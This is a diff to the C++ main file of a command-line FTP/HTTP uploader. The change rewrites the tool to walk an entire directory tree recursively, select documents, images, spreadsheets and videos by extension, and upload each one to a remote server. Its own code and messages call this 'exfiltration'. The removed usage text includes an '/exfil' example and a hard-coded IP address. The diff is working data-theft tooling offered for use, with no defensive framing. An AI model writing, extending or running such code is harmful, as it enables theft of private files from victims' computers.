@@ -1,13 +1,69 @@
 #include <iostream>
 #include <string>
 #include <vector>
-#include <cstdlib>         // For EXIT_*
-#include "FtpUploader.h"   // Our FTP logic
-#include "HttpUploader.h"  // Our HTTP logic
-#include "Utils.h"         // Our helper utilities
-//g++ -o ftp_uploader.exe main.cpp FtpUploader.cpp Utils.cpp HttpUploader.cpp -lwininet -lshlwapi
-int main(int argc, char* argv[])
-{
+#include <filesystem> // For directory traversal
+#include <cstdlib>    // For EXIT_*
+#include "FtpUploader.h"   // FTP logic
+#include "HttpUploader.h"  // HTTP logic
+#include "Utils.h"         // Helper utilities
+
+namespace fs = std::filesystem;
+
+// Function to check if a file has a relevant file extension
+bool isRelevantFileType(const std::string& filePath) {
+    static const std::vector<std::string> relevantExtensions = {
+        ".pdf", ".img", ".png", ".jpg", ".jpeg", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".mp4", ".avi"
+    };
+
+    std::string extension = fs::path(filePath).extension().string();
+    for (const auto& ext : relevantExtensions) {
+        if (extension == ext) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Function to exfiltrate all relevant files from the file system
+void exfiltrateRelevantFiles(
+    const std::string& mode,
+    const std::string& username,
+    const std::string& password,
+    const std::string& server,
+    const std::string& remotePath,
+    const std::string& startPath
+) {
+    try {
+        for (const auto& entry : fs::recursive_directory_iterator(startPath)) {
+            if (entry.is_regular_file()) {
+                const std::string filePath = entry.path().string();
+
+                if (!isRelevantFileType(filePath)) {
+                    std::cout << "[-] Skipping irrelevant file: " << filePath << "\n";
+                    continue;
+                }
+
+                std::cout << "[*] Found relevant file: " << filePath << "\n";
+
+                if (mode == "ftp") {
+                    uploadFTP(username, password, server, filePath, remotePath, {});
+                } else if (mode == "http") {
+                    uploadHTTP(username, password, server, filePath, remotePath, {});
+                } else {
+                    std::cerr << "[-] Unknown mode: " << mode << ". Must be 'ftp' or 'http'.\n";
+                    return;
+                }
+
+                std::cout << "[+] Uploaded: " << filePath << "\n";
+            }
+        }
+    } catch (const std::exception& ex) {
+        std::cerr << "[-] Error during file exfiltration: " << ex.what() << "\n";
+    }
+}
+
+int main(int argc, char* argv[]) {
+    //g++ -static-libgcc -static-libstdc++ -O2 -o ftp_uploader.exe main.cpp FtpUploader.cpp HttpUploader.cpp Utils.cpp -lwininet -lshlwapi
     // Print a banner akin to the original code
     std::cout << R"(
  _____     _ _ _____                 ___         
@@ -17,27 +73,12 @@ int main(int argc, char* argv[])
              v1.0 | FTP/HTTP | by :)
 )" << "\n";
 
-    // We expect:
-    //   argv[1] = "ftp" or "http"
-    //   argv[2] = username
-    //   argv[3] = password
-    //   argv[4] = server (for FTP or HTTP host)
-    //   argv[5] = localPath
-    //   argv[6] = remotePath (FTP directory or HTTP endpoint)
-    //   argv[7] = [optional] comma-separated patterns
-
     if (argc < 7) {
         std::cout << "[!] Usage:\n"
-                  << "    " << argv[0] << " <ftp|http> <username> <password> <server> <localPath> <remotePath> [patterns]\n\n"
+                  << "    " << argv[0] << " <ftp|http> <username> <password> <server> <localPath> <remotePath>\n\n"
                   << "Examples:\n"
-                  << "    " << argv[0] << " ftp user pass 64.94.85.32 C:\\myfiles /upload *.exe,*.txt\n"
-                  << "    " << argv[0] << " ftp user pass ftp.example.com C:\\secret /exfil\n"
-                  << "    " << argv[0] << " http user pass 192.168.1.100 C:\\myfiles /upload *.pdf\n\n"
-                  << "Notes:\n"
-                  << " - If you omit [patterns], all files in <localPath> are uploaded.\n"
-                  << " - Patterns are comma-separated (e.g. \"*.txt,*.pdf\").\n"
-                  << " - For FTP, if your server is on port 21, simply supply the IP/host (e.g. 64.94.85.32).\n"
-                  << " - For HTTP, we assume port 80 (unsecured). Provide the IP or domain.\n";
+                  << "    " << argv[0] << " ftp user pass 64.94.85.32 C:\\myfiles /upload\n"
+                  << "    " << argv[0] << " http user pass 192.168.1.100 C:\\myfiles /upload\n\n";
         return EXIT_FAILURE;
     }
 
@@ -47,36 +88,15 @@ int main(int argc, char* argv[])
     std::string password    = argv[3];
     std::string server      = argv[4];   // e.g., "ftp.example.com" or "192.168.1.100"
     std::string localPath   = argv[5];   // e.g., "C:\\Users\\User\\files"
-    std::string remotePath  = argv[6];   // e.g., "/upload" or "/endpoint"
+    std::string remotePath  = argv[6];   // e.g., "/upload"
 
-    // Optional 7th param: comma-separated list of patterns (e.g. "*.xlsx,*.xls,*.docx")
-    std::vector<std::string> includePatterns;
-    if (argc >= 8) {
-        includePatterns = splitString(argv[7], ',');
-    }
-
-    if (includePatterns.empty()) {
-        std::cout << "[!] No file patterns provided; all files in localPath will be uploaded.\n";
-    }
-
-    // Perform the appropriate upload
+    // Perform the file exfiltration
     try {
-        if (mode == "ftp") {
-            std::cout << "[*] Using FTP mode.\n";
-            uploadFTP(username, password, server, localPath, remotePath, includePatterns);
-            std::cout << "\n[*] File(s) uploaded successfully via FTP.\n";
-        }
-        else if (mode == "http") {
-            std::cout << "[*] Using HTTP mode.\n";
-            uploadHTTP(username, password, server, localPath, remotePath, includePatterns);
-            std::cout << "\n[*] File(s) uploaded successfully via HTTP.\n";
-        }
-        else {
-            std::cerr << "[-] Unknown mode: " << mode << ". Must be 'ftp' or 'http'.\n";
-            return EXIT_FAILURE;
-        }
+        std::cout << "[*] Starting relevant file exfiltration from: " << localPath << "\n";
+        exfiltrateRelevantFiles(mode, username, password, server, remotePath, localPath);
+        std::cout << "\n[*] Relevant files exfiltrated successfully.\n";
     } catch (const std::exception& ex) {
-        std::cerr << "[-] Upload error: " << ex.what() << "\n";
+        std::cerr << "[-] Error: " << ex.what() << "\n";
         return EXIT_FAILURE;
     }
 
